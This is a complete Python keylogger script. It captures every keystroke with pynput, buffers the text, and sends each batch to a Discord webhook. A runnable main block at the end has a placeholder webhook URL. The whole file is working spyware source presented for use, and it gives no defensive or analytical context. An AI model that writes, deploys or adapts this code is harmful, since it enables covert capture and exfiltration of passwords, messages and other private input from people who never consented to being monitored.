from pynput import keyboard
from discord_webhook import DiscordWebhook, DiscordEmbed
import asyncio


class KeyLogger:
    def __init__(
        self,
        webhook_url: str,
        max_buffer_size: int = 30,
        embed_username: str = "KeyLogger",
        embed_title: str = "Pressed Keys",
        embed_color: str = "03b2f8",
        embed_author: str = "Anonymous"
    ):
        self.webhook_url = webhook_url
        self.max_buffer_size = max_buffer_size
        self.embed_username = embed_username
        self.embed_title = embed_title
        self.embed_color = embed_color
        self.embed_author = embed_author

        self.command_list = []
        self.loop = None

    async def send_webhook_async(self, message: str):
        webhook = DiscordWebhook(url=self.webhook_url, username=self.embed_username)
        embed = DiscordEmbed(
            title=self.embed_title,
            description=message,
            color=self.embed_color
        )
        embed.set_author(name=self.embed_author)
        embed.set_timestamp()
        webhook.add_embed(embed)

        await self.loop.run_in_executor(None, webhook.execute)
        print("Webhook sent...")

    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.command_list.append(key.char)
            elif key == keyboard.Key.space:
                self.command_list.append(' ')
            elif key == keyboard.Key.enter:
                self.command_list.append('\n')
            elif key == keyboard.Key.tab:
                self.command_list.append('\t')
            elif key == keyboard.Key.backspace:
                if self.command_list:
                    self.command_list.pop()
            else:
                key_name = str(key).replace('Key.', '')
                self.command_list.append(f'[{key_name}]')

            if len(self.command_list) >= self.max_buffer_size:
                message_text = "".join(self.command_list)

                asyncio.run_coroutine_threadsafe(
                    self.send_webhook_async(message_text),
                    self.loop
                )
                self.command_list.clear()

        except Exception as e:
            print("Error:", e)

    async def start_listener(self):
        self.loop = asyncio.get_running_loop()

        def run_listener():
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()

        await self.loop.run_in_executor(None, run_listener)

    def run(self):
        asyncio.run(self.start_listener())


if __name__ == "__main__":

    kl = KeyLogger(
        webhook_url="Your Webhook Url",
        max_buffer_size=40,
        embed_username="KeyLogger Test",
        embed_title="Pressed Keys",
        embed_color="03b2f8",
        embed_author="Anonymous"
    )
    kl.run()
